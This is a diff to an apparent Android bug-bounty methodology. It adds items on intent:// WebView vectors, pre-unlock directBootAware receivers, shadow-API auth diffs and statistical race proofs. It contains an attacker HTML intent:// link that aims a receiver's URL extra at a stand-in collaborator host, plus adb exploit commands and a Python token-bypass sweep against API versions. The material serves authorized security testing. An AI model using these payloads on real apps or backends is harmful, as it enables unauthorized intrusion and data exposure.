@@ -63,6 +63,9 @@ that value?
    you spend an hour here.
 8. **Sticky broadcasts.** One grep. LEGACY on anything modern; run it because it costs nothing, expect
    nothing.
+9. **The `intent://` question, before you write any severity paragraph.** One grep for `Intent.parseUri`.
+   A hit converts every AM-03 finding above into AM-02, one click — a whole severity band — so establish
+   it before, not after, you rate the chapter.
 
 ## Items
 
@@ -2086,6 +2089,192 @@ grep -rn 'CONNECTIVITY_ACTION\|NETWORK_STATE_CHANGED_ACTION\|EXTRA_WIFI_INFO\|ge
 - **Ruled out when:** The absent-extra branch fails **closed** (trust denied when the SSID cannot be read),
   or the app makes no network-identity trust decision at all. Quote the branch.
 
+### D05-058 · `intent://` in a WebView — the vector that upgrades every receiver primitive to one click
+
+| | |
+|---|---|
+| **Severity ceiling** | High (the item is a *vector*; it inherits the ceiling of whatever component it reaches — up to Critical through D05-051 or D05-029) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) — rated on the component reached |
+| **Attacker** | AM-02 (remote, one click) — this item exists to *change the attacker model* of the rest of the chapter from AM-03 |
+| **Applies to** | Any app whose WebView (or any `shouldOverrideUrlLoading` / deep-link router) calls `Intent.parseUri()` on attacker-reachable content. Also reachable from an XSS in any page the WebView loads. |
+| **Maps to** | Oversecured WebView checklist ("arbitrary activity launching via the `intent://` scheme"); CWE-926; `developer.android.com/privacy-and-security/risks/intent-redirection` |
+
+- **Test:** Decide the attacker model **before** you write the severity paragraph. Every finding in this
+  chapter is AM-03 by default: it needs an installed app. One `Intent.parseUri()` call site in a WebView
+  converts the whole set to AM-02 — a link on a web page — which is a full severity band. Two questions
+  decide it: does the app parse `intent://` at all, and does it dispatch the parsed Intent with
+  `startActivity` (activities only) or with `sendBroadcast`/`startService` (which reaches the receivers in
+  this chapter directly)?
+- **How:**
+```bash
+grep -rn 'parseUri\|Intent.parseUri\|URI_ALLOW_UNSAFE\|URI_INTENT_SCHEME\|URI_ANDROID_APP_SCHEME' out/sources/ -B6 -A12
+grep -rn 'shouldOverrideUrlLoading' out/sources/ -A25 | grep -nE 'startActivity|sendBroadcast|startService|parseUri'
+```
+  The vulnerable shape:
+```java
+if (url.startsWith("intent://")) {
+    Intent i = Intent.parseUri(url, 0);
+    view.getContext().startActivity(i);          // or sendBroadcast(i) — far worse
+}
+```
+  Attacker page:
+```html
+<a href="intent://x#Intent;scheme=app;package=com.target.app;component=com.target.app/.ConfigReceiver;S.url=https%3A%2F%2Fzq7x4mk9.collab.example%2F;end">go</a>
+```
+```bash
+adb shell am start -a android.intent.action.VIEW -d "https://zq7x4mk9.collab.example/poc.html"
+adb shell dumpsys activity activities | grep -m1 topResumedActivity
+```
+- **Proof:** A component of the target app reacting to a click on a **remote page** — `topResumedActivity`
+  naming the target, or the receiver's marker-bearing side effect — recorded end to end from the browser,
+  with no attacker app installed at any point.
+- **Escalation:** This is a D10 defect used as a delivery vector for D05. File the WebView/parser defect in
+  D10, then re-state the attacker model on every receiver finding it reaches. `Intent.parseUri(url, 0)` is
+  bad; `URI_ALLOW_UNSAFE` (flag value 4) is strictly worse because it re-enables the unsafe-parse path —
+  note which one the app uses (see D08).
+- **Ruled out when:** No `parseUri` call site exists, **or** every call site strips
+  `Intent.FLAG_GRANT_*`/`setSelector` and constrains the resulting Intent to an allow-listed component
+  before dispatch (quote the allow-list), **or** the parsed Intent is only ever passed to `startActivity`
+  and every target activity in this app is already independently reachable and harmless. "The WebView only
+  loads our own domain" is not a ruled-out entry unless you also tested for reflected content in that
+  domain.
+
+### D05-059 · `directBootAware="true"` receiver that runs before the device is ever unlocked
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); chain to `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the pre-unlock path exposes a token |
+| **Attacker** | AM-03 (an attacker app can declare `directBootAware` on its own components too, so it runs in the same window); AM-10 for the physical-locked variant |
+| **Applies to** | Android 7+ file-based-encryption devices. `android:directBootAware` defaults to **false** on activities, services, receivers and providers; `LOCKED_BOOT_COMPLETED` is delivered only to direct-boot-aware components. During Direct Boot only **device-protected** storage (`/data/user_de/<user>/<pkg>`) is available. |
+| **Maps to** | `developer.android.com/guide/topics/manifest/receiver-element` (`android:directBootAware`); ATT&CK T1624.001 (`LOCKED_BOOT_COMPLETED`); MASWE-0018 |
+
+- **Test:** A direct-boot-aware receiver executes in a state the rest of the app never designs for: no user
+  has authenticated, credential-encrypted storage is unavailable, and any check that reads it fails. Two
+  distinct questions: does the handler **fail open** when its credential-encrypted state is unreadable, and
+  what does it keep in device-protected storage so that it can work at all?
+- **How:**
+```bash
+grep -nE 'directBootAware="true"' out/AndroidManifest.xml
+grep -n -B2 -A8 'LOCKED_BOOT_COMPLETED' out/AndroidManifest.xml
+grep -rn 'createDeviceProtectedStorageContext\|moveSharedPreferencesFrom\|moveDatabaseFrom\|isUserUnlocked' out/sources/
+# reboot and, WITHOUT entering the PIN, drive the receiver
+adb reboot && adb wait-for-device
+adb shell dumpsys user | grep -i unlocked          # record the pre-unlock state
+adb shell am broadcast -n com.target.app/.BootReceiver -a android.intent.action.LOCKED_BOOT_COMPLETED
+adb shell 'ls -la /data/user_de/0/com.target.app 2>/dev/null'
+```
+- **Proof:** The handler running with `dumpsys user` showing the user still locked — and, where it applies,
+  the contents of `/data/user_de/0/com.target.app/shared_prefs/*.xml` printed from that same pre-unlock
+  shell. Record `getprop ro.crypto.type` (`file` vs `block`) because the storage split only exists under
+  FBE.
+- **Escalation:** → D11 (what lives in device-protected storage is outside the credential key, so disk
+  encryption is not the control the vendor thinks it is); → D13 if a token or device-binding secret is
+  there; pair with D04's `showWhenLocked` items for a complete pre-unlock chain.
+- **Ruled out when:** No component declares `directBootAware="true"` (the default is false, so the grep
+  returning nothing *is* the negative here), **or** every direct-boot-aware handler gates its work on
+  `UserManager.isUserUnlocked()` and no secret is written through
+  `createDeviceProtectedStorageContext()` — quote the gate and list what the `user_de` directory actually
+  contains.
+
+### D05-060 · Turn the broadcast-harvested route inventory into a shadow-API version diff
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical (through the backend, not through the broadcast) |
+| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) where the old version accepts no token; `broken_access_control.idor.*` (P1/P2/P3) where it exposes objects the current version protects; a bare version difference is **Informational** |
+| **Attacker** | AM-01 (once it is the backend, no device is involved) |
+| **Applies to** | Any app whose broadcasts, implicit intents or sniffed API-response bus (D05-030, D05-031) reveal backend hosts, routes or an API version segment. |
+| **Maps to** | Shadow/zombie-API methodology from the bug-hunting corpus ("a mobile app's hardcoded backend calls look older than the current web app's"); CWE-1059-adjacent operational debt — file under the behaviour you prove, not under "old version" |
+
+- **Test:** The broadcast bus is a free route inventory: a request-complete broadcast carries the URL, the
+  method and often the whole response body for every call the app makes. The structural bet worth making on
+  every mobile engagement is that those hardcoded routes are an **older API version** than the current web
+  client uses — with weaker auth, weaker rate limits, weaker input validation and more field exposure. The
+  version difference is not the finding; the weakened control is.
+- **How:**
+```bash
+# routes from the sniffed extras and from the package itself
+grep -ohE 'https?://[A-Za-z0-9._-]+(/[A-Za-z0-9._~%-]+)*' /tmp/sniffed_extras.log out/sources/**/*.java \
+  | sort -u > /tmp/routes.txt
+wc -l /tmp/routes.txt        # count everything; never iterate this in a shell array loop
+```
+```python
+# behavioural diff, same operation, same account, both versions — Python, not a shell loop
+import itertools, requests
+VERSIONS = ["v1", "v2", "v3", "internal", "legacy"]
+OP = "/users/{id}"
+for v, tok in itertools.product(VERSIONS, ["", "expired", "lowpriv", "valid"]):
+    url = f"https://api.target.example/api/{v}{OP.format(id=1337)}"
+    h = {} if not tok else {"Authorization": f"Bearer {TOKENS[tok]}"}
+    r = requests.get(url, headers=h, timeout=10)
+    print(v, tok or "none", r.status_code, len(r.content))
+```
+  Diff four behaviours for the **same** operation: auth strength (does the old version accept no token, an
+  expired token, or a lower-privilege token the current one rejects?), rate limiting (burst both; a missing
+  429 means throttling was never backported), input validation (the same oversized or injected payload to
+  both), and field exposure (does the old version return internal ids or PII the current one redacts?).
+- **Proof:** The same request against both versions side by side, with the same account, showing the
+  control present on one and absent on the other — and a **body** diff, not a status-code diff. A 200 with a
+  byte-identical body is not a bypass. Before claiming a reflected or injected value, search the baseline
+  response for your marker first.
+- **Escalation:** → D15 for the filing; the mobile side of the finding is only how you discovered the
+  route. Where the old version accepts an unauthenticated call, run the layer-ordering check before
+  claiming auth bypass: a `400 "field X is required"` from an unauthenticated request does not prove you
+  passed auth, because many stacks run the body parser or sanitiser in front of the auth middleware —
+  re-test with a minimal well-formed `{}` body.
+- **Ruled out when:** Every version prefix you found answers 404 or connection-refused, **or** the four
+  behaviours are identical across versions when tested with the same account and the same payloads. Record
+  the version list you swept and the four-behaviour result table — "only v2 exists" is a defensible
+  negative; "I only tried v1" is not.
+
+### D05-061 · Prove delivery-order and spray wins statistically, never from one lucky run
+
+| | |
+|---|---|
+| **Severity ceiling** | Support |
+| **VRT** | n/a — enabler; governs D05-036, D05-037, D05-038, D05-042, D05-043, D05-046 and the D05-051 spray |
+| **Attacker** | AM-03 |
+| **Applies to** | Every claim of the form "my receiver gets it first", "my component wins resolution", "the consent-Intent spray lands". |
+| **Maps to** | Statistical-Sample Rule and the Shell-Loop Ban from the bug-hunting corpus |
+
+- **Test:** Delivery order, resolver ordering and the background-activity-launch spray are all **races**.
+  One success is an anecdote, and a triager who reproduces once and fails writes the report off. Quantify
+  the win rate before you claim the primitive, and quantify it again on the device family the client cares
+  about.
+- **How:** Interleave control and test, at least ten trials each, and **count your results** — a zsh array
+  loop can fail silently and still print a plausible transcript:
+```python
+import subprocess, collections, random, time
+PKG="com.target.app"; ACT="com.target.app.ORDERED_ACTION"
+res=collections.Counter()
+trials=[("test",)]*10 + [("control",)]*10
+random.shuffle(trials)
+for (kind,) in trials:
+    subprocess.run(["adb","shell","logcat","-c"])
+    if kind=="control":
+        subprocess.run(["adb","uninstall","com.poc.zeroperm"])
+    subprocess.run(["adb","shell","am","broadcast","-a",ACT,"--receiver-foreground"])
+    time.sleep(1.5)
+    out=subprocess.run(["adb","shell","logcat","-d","-s","PoC","TARGET"],
+                       capture_output=True,text=True).stdout
+    first = "PoC" if out.find("PoC") != -1 and (out.find("TARGET")==-1 or out.find("PoC")<out.find("TARGET")) else "TARGET"
+    res[(kind,first)]+=1
+print(res, "trials:", sum(res.values()))   # assert the count equals len(trials)
+```
+  For a timing-shaped claim (who was scheduled first, whether the spray beat the resume), report mean,
+  median and σ per group and require the difference to be at least 2σ — network and scheduler jitter
+  routinely produce 2× single-shot outliers.
+- **Proof:** A table of n trials with the win count and the failure mode named, included in the report. For
+  the D05-051 spray, state the precondition honestly — "captures on the victim's next OTP screen, observed
+  in k of n attempts" — rather than "unconditional".
+- **Escalation:** None — it is what makes D05-036, D05-043 and D05-051 survive triage rather than being
+  closed as not-reproducible.
+- **Ruled out when:** Across n >= 10 interleaved trials the attacker component never wins, or wins at a
+  rate indistinguishable from the control. That is a true negative: record the trial count, the win rate
+  and the device API level, because the same PoC may win on a different release (see the Android 16 gate in
+  D05-036).
+
 ### D05-062 · Run the pre-severity gate against the Critical claim, not against the receiver
 
 | | |
@@ -2201,6 +2390,10 @@ These primitives have independent fix surfaces and are filed separately per the 
 | Download-completion receiver acts on `extra_download_id` but `DownloadManager.query` is UID-scoped | The victim's query for your id returns an empty cursor, so no cross-app injection occurs. Record the empty cursor. | The handler resolves the id through a path that is not UID-scoped, or it accepts a `content://`/`file://` URI directly from the extras. |
 | A `Parcelable` extra crashes the receiver, with no gadget identified | Reachable deserialisation without a proven gadget is a primitive, and a crash alone is the P5 node. | A gadget class in the app's own dependency set is constructed in the victim's process (Frida `[REACHED]`), or the deserialisation reaches a file or code sink (→ D17). |
 | Receiver clears the session ("logout from any app") | Nuisance-grade availability; the user simply logs back in. | The receiver **sets** session state from an extra — that is fixation, and the victim then operates inside the attacker's account (D05-016). |
+| Interception, resolver win or consent-Intent spray demonstrated in a single run | A race proved once is an anecdote; the triager who fails to reproduce closes it. Scheduler jitter alone produces single-shot outliers. | n >= 10 interleaved trials with the win count, the failure mode named, and the device API level recorded (D05-061). |
+| The mobile client calls `/api/v1` while the web app calls `/api/v3` | **A version difference alone is Informational.** Old-but-identical is operational debt, not a vulnerability. | A behavioural delta on the old path for the same operation and the same account — weaker auth, a missing 429, weaker input validation, or fields the current version redacts — shown as a body diff, not a status-code diff (D05-060). |
+| An unauthenticated call to a harvested route returns `400 "field X is required"` | That is the layer-ordering trap: many stacks run the body parser or sanitiser in front of the auth middleware, so a validation error proves nothing about auth. | Re-test with a minimal well-formed `{}` body; only a response that performs the operation (or leaks its data) without a token is an auth bypass. |
+| A component declares `android:directBootAware="true"` | The attribute alone is ordinary for boot, messaging and MDM paths; the default is `false`, so its presence is a decision, not yet a defect. | The pre-unlock handler fails open with credential-encrypted state unreadable, or a token/key is written through `createDeviceProtectedStorageContext()` and read back from `/data/user_de/0/<pkg>` before the PIN (D05-059). |
 | OAuth `client_secret` recovered from the app and seen in a broadcast extra | A mobile client secret is public by design and is on every program's never-submit list. | The reportable adjacent finding is **PKCE non-enforcement** on the public client (→ D13), not the secret's presence. |
 
 ## Cross-surface joins
@@ -2270,7 +2463,9 @@ These primitives have independent fix surfaces and are filed separately per the 
   cancels pending intents, `ApplicationStartInfo.wasForceStopped()`), Android 16 (ordered-broadcast priority
   confined to the same process and clamped; `BluetoothDevice#ACTION_KEY_MISSING`,
   `ACTION_ENCRYPTION_CHANGE`); `develop/ui/views/appwidgets`;
-  `reference/android/app/DownloadManager`; `developers.google.com/identity/sms-retriever/user-consent/request`.
+  `reference/android/app/DownloadManager`; `guide/topics/manifest/receiver-element` (`android:directBootAware`,
+  default `false`; Direct Boot sees only device-protected storage);
+  `developers.google.com/identity/sms-retriever/user-consent/request`.
 - Bugcrowd VRT release 2026-07-08: `broken_access_control.exposed_sensitive_android_intent` (priority null,
   CWE-927, all-zero CVSS v3 vector — the priority comes entirely from what you demonstrate);
   `broken_access_control.privilege_escalation`; `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset`;
@@ -2306,8 +2501,10 @@ These primitives have independent fix surfaces and are filed separately per the 
   auditing tip "Look for all intent broadcasts that do not have a target set ... Lacks `setComponent`,
   `setClass`, `setClassName` or an explicit constructor"; "Implicit broadcasts (receiving)" (CWE-925) with
   the note that checking `getCallingActivity()` in `onReceive` is not a real control.
-- Bug-hunting methodology corpus (Claude-BugHunter, 4,467 stars): the layer-ordering trap applied here as
-  the `result=0` kill gate; Marker Discipline and the Body-Diff Rule; the Shell-Loop Ban; the Shadow API
-  mobile-to-backend bridge; the Pre-Severity Gate run against the Critical claim; retraction discipline and
-  its inverse; the five-screenshot state-change pattern and the PII split of what to mask versus what to
-  leave visible; and chain-filing order (primitives first, consumer second, backfill the links).
+- Bug-hunting methodology corpus (Claude-BugHunter, 4,467 stars): the layer-ordering trap, applied here as
+  the `result=0` kill gate and again against an apparently unauthenticated shadow-API route; Marker
+  Discipline and the Body-Diff Rule; the Statistical-Sample Rule (n >= 10 interleaved, >= 2σ) for the
+  delivery-order and spray races; the Shell-Loop Ban; the Shadow API mobile-to-backend bridge; the
+  Pre-Severity Gate run against the Critical claim; retraction discipline and its inverse; the
+  five-screenshot state-change pattern and the PII split of what to mask versus what to leave visible; and
+  chain-filing order (primitives first, consumer second, backfill the links).
